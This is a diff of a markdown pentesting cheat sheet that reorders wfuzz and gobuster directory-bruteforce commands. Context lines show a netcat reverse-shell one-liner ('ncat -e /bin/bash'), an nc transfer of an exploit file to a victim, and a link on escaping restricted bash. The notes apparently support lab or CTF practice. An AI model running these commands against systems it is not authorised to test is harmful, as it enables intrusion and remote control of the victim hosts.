@@ -38,6 +38,13 @@ In the above it is listing all files of home directory with permissions<br>
 ls -al<br>
 **show permission of directory or file**<br>
 ls -ld<br>
+**Dir and File Bruteforce or enumeration**<br>
+*WFUZZ*<br>
+wfuzz -c -z file,/root/SecLists/Discovery/Web-Content/common.txt --hc 404,400 -X GET -u http://10.10.10.160/FUZZ<br>
+
+**Gobuster Dir enumeration**<br>
+```gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 20 -e -x php,htm,html,txt -u http://target```<br>
+
 **REVERSE SHELL**<br>
 
 Victim: ncat -e /bin/bash {IP} {PORT}<br>
@@ -64,8 +71,7 @@ Attacker:nc -lvp 4444 < /root/home/exploit.txt<br>
 Victim:nc 192.168.1.102 4444 > exploit.txt<br>
 
 
-**Gobuster Dir enumeration**<br>
-```gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 20 -e -x php,htm,html,txt -u http://target```<br>
+
 
 **bypass-bash-restrictions**<br>
 https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions<br>
@@ -102,6 +108,4 @@ No (R) 	 (W) 	(X)<br>
 
 755 is the same as rwxr-xr-x<br>
 
-**Dir and File Bruteforce or enumeration**<br>
-*WFUZZ*<br>
-wfuzz -c -z file,/root/SecLists/Discovery/Web-Content/common.txt --hc 404,400 -X GET -u http://10.10.10.160/FUZZ<br>
+
